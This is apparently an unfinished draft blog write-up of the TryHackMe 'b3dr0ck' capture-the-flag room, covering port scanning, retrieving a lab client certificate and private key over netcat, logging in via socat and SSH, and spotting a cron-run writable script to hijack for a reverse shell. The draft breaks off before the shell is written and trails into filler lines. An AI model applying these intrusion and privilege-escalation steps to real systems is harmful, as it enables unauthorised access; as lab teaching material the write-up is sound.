---
layout: post
title: 'b3dr0ck - {THM}'
post_date: 04/09/2022
post_time: '06:15 PM'
permalink: /blog/thm-b3dr0ck/
published: false
categories:
  - thm
  - ctf
  - b3dr0ck
  - f11snipe
  - linux
  - tls
  - ssl

---
<h2>b3dr0ck</h2>
<p>Join room: <a title="Join this room!" href="https://tryhackme.com/jr/b3dr0ck" target="_blank" rel="noopener">tryhackme.com/jr/b3dr0ck</a></p>
<p><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649629406725-b3dr0ck-intro.png" alt="b3dr0ck intro" width="791" height="300" /></p>
<h3>Steps</h3>
<ul>
<li>Start Machine and wait for VM ip address</li>
<li>First test http connection to http://MACHINE_IP/ (default port 80)
<ul>
<li>Looks like it redirects to https://MACHINE_IP:4040/</li>
<li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630285347-b3dr0ck-https.png" alt="https connection" width="368" height="278" /></li>
<li>Accept self-signed cert and continue</li>
<li><img src="https://sls-ci-bowtie-houndstooth-root-us-east-1-assets.s3.amazonaws.com/5290charlie/blog/1649630512983-b3dr0ck-https-open.png" alt="" width="365" height="277" /></li>
<li>Ok, looks like we found the homepage. Let's see what nmap shows us</li>
</ul>
</li>
<li>Run nmap port scan
<ul>
<li>
<pre>$ nmap -v -T4 10.10.74.126 
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-10 16:48 MDT
Initiating Ping Scan at 16:48
Scanning 10.10.74.126 [2 ports]
Completed Ping Scan at 16:48, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:48
Completed Parallel DNS resolution of 1 host. at 16:48, 0.00s elapsed
Initiating Connect Scan at 16:48
Scanning 10.10.74.126 [1000 ports]
Discovered open port 22/tcp on 10.10.74.126
Discovered open port 80/tcp on 10.10.74.126
Discovered open port 9009/tcp on 10.10.74.126
Completed Connect Scan at 16:48, 9.02s elapsed (1000 total ports)
Nmap scan report for 10.10.74.126
Host is up (0.12s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9009/tcp open  pichat

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.16 seconds</pre>
</li>
<li>Hmm port <strong>9009</strong> looks interesting, let's connect with&nbsp;<strong>netcat</strong></li>
</ul>
</li>
<li>Run&nbsp;<strong>netcat</strong> to test connecting to port&nbsp;<strong>9009</strong>
<ul>
<li>
<pre>$ netcat 10.10.74.126 9009


 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ &lt;| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for?</pre>
</li>
<li>
<p>Cool! Connected to something ... what are we looking for here? Let's try&nbsp;<strong>ls</strong>...</p>
</li>
<li>
<pre>What are you looking for? ls
Sorry, unrecognized request: 'ls'

You use this service to recover your client certificate and private key</pre>
</li>
<li>Ok, so this prompt is here to help recover creds? What does&nbsp;<strong>help</strong> tell us?</li>
<li>
<pre>What are you looking for? help
Looks like the secure login service is running on port: 54321

Try connecting using:
socat stdio ssl:MACHINE_IP:54321,cert=&lt;CERT_FILE&gt;,key=&lt;KEY_FILE&gt;,verify=0</pre>
</li>
<li>Nice, that looks helpful... Let's try looking for the credentials</li>
<li>
<pre>What are you looking for? cert    
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMjA0MTAyMjI3MzNaFw0yMzA0MTAyMjI3MzNaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQD0GdL0
lGcTywIjd8uJJoyGH5m4t/B1+SaOgWPtz+ehGsxKQbQBbq7UzsvNRtzH+3dv244O
KUWH5gWzparA+KTWgkit3W+Lybe89dcCJ5w8Vl7OifXn59dJkrQJieQHg1PSbdzd
PFYNNhkv5fFXsOQE0tnr0qNLbVugx566k3oKJwQiuhLTICGNL90wDC9KdkDAMzuJ
Xjoz0YvG+hK8trcuxy67AbxzMKZuT1RNrxnhUpevRe9tw721nmY3KUd1o87o5x6l
WIR2vnkYjMept+Yp2+sHlUd4DTpn7y6YA8TCAxvscg2idP6YehnH9/ML6Vj+Sp0j
OlQWGKLvbZV87i7DAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAFz2UYKtBTlRYqlU
t5czCj8FfkUT/tbuZtfDp2FddEcJOBPHJZGD1sKiNgqAzeAXYcluELOy/E5wgD9E
MFs4NFGJJEOvqplf+bfpvbQ6cOVNDN0BF+AgjNCaAydJHvwUbvPeA5j7Mqan6HJA
ggmTJGTI6mdustCaYJ/4dRo8WeO473aGYtC3wqwaKw6DVNqDAVIc4d6KITP4BzAZ
9iuNYuh0jJcge1SHYGMSW87b8XTCuDpYgts+oKA6Z3+YGPez3g8KwZAYhaJ75eYe
oiaheRhUyPndTqjFzIzx9pjj52cf9/xeYd/1agg+axfY9l65znYSrVPnIcuovD8w
QHHocgs=
-----END CERTIFICATE-----</pre>
</li>
<li>BOOM! Got a certificate! The other response mentioned a private key also, I wonder...</li>
<li>
<pre>What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9BnS9JRnE8sCI3fLiSaMhh+ZuLfwdfkmjoFj7c/noRrMSkG0
AW6u1M7LzUbcx/t3b9uODilFh+YFs6WqwPik1oJIrd1vi8m3vPXXAiecPFZezon1
5+fXSZK0CYnkB4NT0m3c3TxWDTYZL+XxV7DkBNLZ69KjS21boMeeupN6CicEIroS
0yAhjS/dMAwvSnZAwDM7iV46M9GLxvoSvLa3LscuuwG8czCmbk9UTa8Z4VKXr0Xv
bcO9tZ5mNylHdaPO6OcepViEdr55GIzHqbfmKdvrB5VHeA06Z+8umAPEwgMb7HIN
onT+mHoZx/fzC+lY/kqdIzpUFhii722VfO4uwwIDAQABAoIBAG7qaQvPfwLkZOVe
4rJAPOwY4c2obu/8NUPdkV2W8cYnmhpHvpZEB9cU3FA7WcjY/81o8ySGJlz47TBT
H8KteKEr9ABktPHMx9tpzbfh7cEQ8eVhlMY6d32r1njbGi07xFPCrfAtIWDBazJz
hnV1IDb85B6eyKpWV6M38W0P5A1GCBCwYwqjP2oBKaHxnDKyiBIHPazc1bPQNo3Q
z2rh9aIoVtSVL44zuc6R0pGppvIdHOy5v2RfRAzmFuqPDr0xpHvxHI92zirmCLxi
lEeq0hEHl0XaezKu1//LrBBxng7sDN8zEgCIfaVGU+eEaLhmjOV6jkjYXbTn3HnF
RFLzLTkCgYEA/A1BlspCIqnL48NVhjAQ7rnF7bnYPAeEBnAsYl2rUoYX5pTJy9fA
tGi4fxA6yZ+JIu//o8GLEZOpUrXN0yyKNUjLxTn5Fkw5b5Xpk9/fVlIv7lnv0tx+
bpLOVrc3lL08pRi6ri1TCoSo9e1UXm8aaNOsQQakp2FOtmDMQqYx8q0CgYEA9+yv
JysNuVAzvdccwNgtkrOaov57iwYXZKMatFZDmjKrggxpRC47QaILBAKkhuY9loiP
RYrTh26c0NvAWcel702msDKhtIYSiGKEhhCjetMtwEQHozVwDHcgaiY6G9ijmQ6J
ADFX/ZH0vL89HWd9UaKbXsXu7dUJ3xBFIdYCRS8CgYAKNQc48gvnl3S4TorCGmQ1
JrTLQcFt/Oft0tEZUq3Dc8a4AcKCTMRzCeKe0qtuytUk4w85NHdLSO2MeexR5vXZ
3o7R990MeB3DVRDWejRzLHTgdCfwJBnCpJNSk6zeiyNPlEbLEu7P+DtXajsGb/1j
zV6ma3xzgs9LN3ROJqjTKQKBgQDnWPpcv2UwDrIprSjMny1vnp9nB7d7FHUR2M2b
iH/OzQeT9Ebqc4WiCjbjSCAFLaY86TNgflpDH6m/j8AfRxkFhF1OQAD7NrzmfaAS
hkY24AbqSdEisEPdrfAWfZNt1qtasOCQyHrGSMOquX2rCZ48ZlM7jdIWJtzuRP1t
xIkbywKBgE0pqu4L98MFQ4NxfEAkSHmRIIVxewW89qSm5pCMzr9YzXLHlXbTUu1S
CbipVXzzHspb+jkPFohQORTOK1sb4IJcA7+dEuQO3CJ2s8PT1MUOcbuWGRQSt0Rl
7u12J3N1/k/ZygC+c9alrGEm/GuWUYAGW5LkbmAqJO8VXQ0B5fD6
-----END RSA PRIVATE KEY-----</pre>
</li>
<li>Got it! Cool, let's save these to local files:&nbsp;<strong>client.crt</strong> and <strong>client.key</strong></li>
</ul>
</li>
<li>The previous&nbsp;<strong>help</strong> output mentioned <strong>"socat" </strong>connect with credentials over port <strong>54321</strong>. Let's try that<br />
<ul>
<li>
<pre>$ socat stdio ssl:10.10.74.126:54321,cert=client.crt,key=client.key,verify=0


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck&gt; </pre>
</li>
<li>Yay! It authorized us as "Barney Rubble" (from the credentials we downloaded on&nbsp;<strong>9009</strong>)</li>
<li>What can we access here?</li>
<li>
<pre>b3dr0ck&gt; whoami
Current user = 'barney' (Barney Rubble peer certificate)
b3dr0ck&gt; ls
Unrecognized command: 'ls'

This service is for login and password hints<br />b3dr0ck&gt; help
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'barney')
</pre>
</li>
<li>
<p>Hmm, that hint looks more like a random password. Can we login?</p>
</li>
<li>
<pre>b3dr0ck&gt; login
Login is disabled. Please use SSH instead.</pre>
</li>
<li>Ok, let's try to access using SSH</li>
</ul>
</li>
<li>SSH as&nbsp;<strong>barney</strong> with password obtained above
<ul>
<li>
<pre>$ ssh barney@10.10.74.126
The authenticity of host '10.10.74.126 (10.10.74.126)' can't be established.
ECDSA key fingerprint is SHA256:wQ21BG+EOKJCF/4/7AIY9n8e86E7MAN2gH/J/+koWk4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.74.126' (ECDSA) to the list of known hosts.
barney@10.10.74.126's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 10 Apr 2022 11:10:22 PM UTC

  System load:  0.0               Processes:             114
  Usage of /:   57.0% of 7.07GB   Users logged in:       0
  Memory usage: 23%               IPv4 address for eth0: 10.10.74.126
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Sun Apr 10 21:02:13 2022 from 192.168.1.67
barney@b3dr0ck:~$</pre>
</li>
<li>
<p>We're in! Let's get the first flag:&nbsp;<strong>barney.txt</strong></p>
</li>
<li>
<pre>barney@b3dr0ck:~$ ls -l
total 4
-rw------- 1 barney barney 38 Apr 10 00:20 barney.txt
barney@b3dr0ck:~$ cat barney.txt 
THM{***}</pre>
</li>
</ul>
</li>
<li>Now we're on the machine as&nbsp;<strong>barney</strong> user, what can we do?
<ul>
<li>
<pre>barney@b3dr0ck:~$ cd ..
<br />barney@b3dr0ck:/home$ ls
barney  fred
<br />barney@b3dr0ck:/home$ cd fred
<br />barney@b3dr0ck:/home/fred$ ls -l
total 8
-rwx-wx--x 1 fred barney 41 Apr 10 01:34 backup
-rw------- 1 fred fred   38 Apr 10 00:22 fred.txt
barney@b3dr0ck:/home/fred$ cat fred.txt
cat: fred.txt: Permission denied
<br />barney@b3dr0ck:/home/fred$ cat backup
cat: backup: Permission denied
<br />barney@b3dr0ck:/home/fred$ ./backup 
/bin/bash: ./backup: Permission denied</pre>
</li>
<li>Ok, so we see another user&nbsp;<strong>fred</strong>, but we can't access flag&nbsp;<strong>fred.txt</strong></li>
<li>Also see an executable file named&nbsp;<strong>backup</strong>, but unable to read or execute it...</li>
<li>Taking a closer look at the permissions, appears&nbsp;<strong>barney</strong> is allowed&nbsp;<strong>write</strong> access, but cannot read
<ul>
<li><em>This vector can also be found via find/search for writeable files</em></li>
</ul>
</li>
<li>Wonder what that executable is for ...</li>
<li>
<pre>barney@b3dr0ck:/home/fred$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
*  *    * * *   fred    ./backup</pre>
</li>
<li>Found it!&nbsp;<strong>fred</strong> is calling his&nbsp;<strong>backup</strong> script every minute via <strong>/etc/crontab</strong>&nbsp;</li>
<li>Ok, so we can&nbsp;<strong>write</strong>, but cannot&nbsp;<strong>read/execute</strong> ... maybe we can overwrite it's contents with our own script?</li>
<li>Let's write up a reverse shell using&nbsp;<strong>bash</strong>
<ul>
<li>&nbsp;</li>
</ul>
</li>
</ul>
</li>
<li>asdf</li>
<li>sdf</li>
<li>asdf</li>
<li>asdfa</li>
<li>sdfa</li>
<li>sdfasdf</li>
<li>&nbsp;</li>
<li>...</li>
</ul>
<p>&nbsp;</p>
